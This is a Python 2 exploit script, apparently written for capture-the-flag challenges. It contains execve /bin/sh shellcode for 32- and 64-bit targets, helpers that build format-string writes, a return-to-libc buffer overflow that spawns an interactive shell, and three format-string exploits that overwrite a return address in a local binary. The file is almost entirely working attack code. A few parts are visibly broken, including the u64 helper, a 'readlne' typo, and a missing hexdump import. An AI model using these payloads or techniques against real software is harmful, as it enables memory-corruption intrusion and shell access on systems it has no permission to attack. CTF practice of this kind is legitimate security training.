#!/usr/bin/python
# -*- coding: utf-8 -*-

import __main__, os, sys, struct, socket, telnetlib, subprocess, time

from libformatstr import FormatStr

#import hexdump

proc = ''
s = ''
 
def local(cmd):
    __main__.proc = subprocess.Popen(cmd.strip().split(' '))
    proc.wait()

def pipelocal(cmd):
    __main__.proc = subprocess.Popen(cmd.strip().split(' '), stdin=subprocess.PIPE, stdout=subprocess.PIPE)

# socat tcp-listen:4444,reuseaddr,fork exec:./a.out
def sock(remoteip="127.0.0.1", remoteport=4444):
    __main__.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteip, remoteport))
    time.sleep(0.5)

def writefile(buf_arg,file_name):
    with open(file_name, 'wb') as f:
        f.write(buf_arg)

def recv(delim='\n', out=1):
    data = ''
    while not data.endswith(delim):
        data += s.recv(1)
    if(out == 1):
        print('\nrecv: \n' + data + '\n')
    return data

def recvn(x=1024, out=1):
    data = ''
    data += s.recv(x)
    if(out == 1):
        print('\nrecv: \n' + data + '\n')
    return data

def send(x, sleep=0.3, out=1):
    s.sendall(x + '\n')
    if(out == 1):
        print('\nsend: \n' + x + '\n')
    time.sleep(sleep)

def u(x):
    return struct.unpack("<I",x[:4])[0]

def u64(x):
    return struct.unpack("<I",x[:8])[0]

def p(x):
    return struct.pack("<I",x)

def p64(x):
    return struct.pack("<Q",x)

def shell():
    if(s != ''):
        print('---- interactive mode ----')
        t= telnetlib.Telnet()
        t.sock = s
        t.interact()
    elif(p != ''):
        print('---- interactive mode ----')
        proc.wait()

#katagaitai_command_start
#def xxd(a):
#    hexdump.hexdump(a)
#
#def dbg(ss):
#    print "[+] %s: 0x%x"%(ss, eval(ss))
#
#def countdown(n):
#    for i in xrange(n,0,-1):
#        print str(i) + "..",
#        sys.stdout.flush()
#        time.sleep(1)
#    print
#katagaitai_command_end

def xxd(a):
    a = str(a)
    hexdump.hexdump(a)

def read(delim="\n"):
    data = ''
    while not data.endswith(delim):
        data += proc.stdout.readlne(1)
    print('\nread: \n' + data + '\n')
    return data

def readn(num):
    data = ''
    while(num>0):
        data += proc.stdout.read(1)
        num = num-1
    print('\nread: \n' + data + '\n')
    return data
 
def fsa1(recent_len, index_start, after_data):
    data = '%' + \
            str( ((after_data-int(hex(recent_len)[:4],16)-1)%0x100)+1 ) + \
            'c%' + str(index_start) + '$hhn'
    return data

def fsa4(recent_len, index_start, after_addr):
    a = map(ord,p(after_addr))
    b = map(ord,p(after_addr))
    a[3] = ((a[3]-a[2]-1) % 0x100) + 1
    a[2] = ((a[2]-a[1]-1) % 0x100) + 1
    a[1] = ((a[1]-a[0]-1) % 0x100) + 1
    a[0] = ((a[0]-int(hex(recent_len)[:4],16)-1) % 0x100) + 1
    data = ''
    data += '%{0}c'.format(str(a[0])) + \
            '%' + str(index_start+0) + '$hhn'
    data += '%{0}c'.format(str(a[1])) + \
            '%' + str(index_start+1) + '$hhn'
    data += '%{0}c'.format(str(a[2])) + \
            '%' + str(index_start+2) + '$hhn'
    data += '%{0}c'.format(str(a[3])) + \
            '%' + str(index_start+3) + '$hhn'
    return data

sc_execve32 = "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"
sc_execve64 = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"

#-----------START EXPLOIT CODE-----------#

#miyactf/100questions

system = 0xb7e53310
binsh = 0xb7f75bac

sock('localhost', 4444)

num = recv(' ')
a = int(recv(' '))
mark = recv(' ')
b = int(recv(' '))
recvn(1024, 0)
send(str(a + b), 0)
recv('\n')
while(1):
    num = recv(' ')
    if not(num.count('[')):
        break
    a = int(recv(' '))
    mark = recv(' ')
    b = int(recv(' '))
    recvn(1024, 0)
    send(str(a + b), 0)
    recv('\n')

recvn()
#raw_input('wait')

buf = ''
buf += 'a'*128
buf += p(system)
buf += 'bbbb'
buf += p(binsh)
#buf = 'hogehoge'

send(buf)
recvn()
shell()


###################################################################


#momo/12

##########################
# [+]pattern01: momo-tech
##########################
cmd = './fullRelrofs'
buf_addr = 0xbffff384
ret_off = 0xd8
ret_addr = buf_addr + ret_off
idx = 5
buf = ''
buf += p(ret_addr)
buf += p(ret_addr + 1) 
buf += p(ret_addr + 2) 
buf += p(ret_addr + 3) 
buf += sc_execve32
a = map(ord,p(buf_addr+4*4))
a[3] = ((a[3]-a[2]-1) % 0x100) + 1
a[2] = ((a[2]-a[1]-1) % 0x100) + 1
a[1] = ((a[1]-a[0]-1) % 0x100) + 1
a[0] = ((a[0]-len(buf)-1) % 0x100) + 1
buf += '%%%dc%%%d$hhn' % (a[0],idx)
buf += '%%%dc%%%d$hhn' % (a[1],idx+1)
buf += '%%%dc%%%d$hhn' % (a[2],idx+2)
buf += '%%%dc%%%d$hhn' % (a[3],idx+3)
#local(cmd + ' ' + buf)

#############################
# [+]pattern02: miya-function
#############################
cmd = './fullRelrofs'
buf_addr = 0xbffff384
ret_off = 0xd8
ret_addr = buf_addr + ret_off
idx = 5
buf = ''
buf += p(ret_addr)
buf += p(ret_addr + 1) 
buf += p(ret_addr + 2) 
buf += p(ret_addr + 3) 
buf += sc_execve32
buf += fsa4(len(buf), idx, buf_addr+4*4)
#local(cmd + ' ' + buf)

#############################
# [+]pattern03: libformatstr
#############################
cmd = './fullRelrofs'
idx = 5
buf_addr = 0xbfffefc4
ret_off = 0xd8
ret_addr = buf_addr + ret_off
addr = ret_addr
p = FormatStr()
rop = [buf_addr+1024]
p[addr] = rop
buf = ''
buf += p.payload(idx)
buf += 'A'*(1024-len(buf))
buf += sc_execve32
#local(cmd + ' ' + buf)
